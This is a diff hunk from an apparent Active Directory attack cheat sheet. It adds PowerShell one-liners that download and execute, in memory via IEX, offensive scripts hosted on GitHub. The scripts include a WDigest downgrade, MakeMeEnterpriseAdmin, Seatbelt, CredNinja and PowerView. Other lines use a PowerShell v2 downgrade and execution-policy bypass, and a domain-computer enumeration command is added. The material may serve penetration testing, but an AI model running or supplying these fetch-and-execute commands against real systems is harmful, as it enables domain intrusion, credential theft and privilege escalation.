@@ -24,14 +24,15 @@ IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/mas
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Invoke-WdigestDowngrade.ps1'));
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/MakeMeEnterpriseAdmin.ps1'));
 IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Seatbelt.ps1'));
-IEX($browser.DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
-IEX($browser.DownloadString(''));
+IEX($browser.DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1'));Import-ActiveDirectory
+IEX($browser.DownloadString('https://raw.githubusercontent.com/Raikia/CredNinja/master/Invoke-CredNinja.ps1'));
 IEX($browser.DownloadString(''));
 IEX($browser.DownloadString(''));
 
 powershell -version 2 -command {$browser.DownloadString('https://raw.githubusercontent.com/PowershellMafia/PowerSploit/dev/Recon/PowerView.ps1'));}
 powershell -ep bypass 
 
+get-netcomputer -fulldata | select cn,operatingsystem,logoncount,lastlogin | format-table -wrap -autosize | out-file computers.txt
 
 Find-DomainShare
 
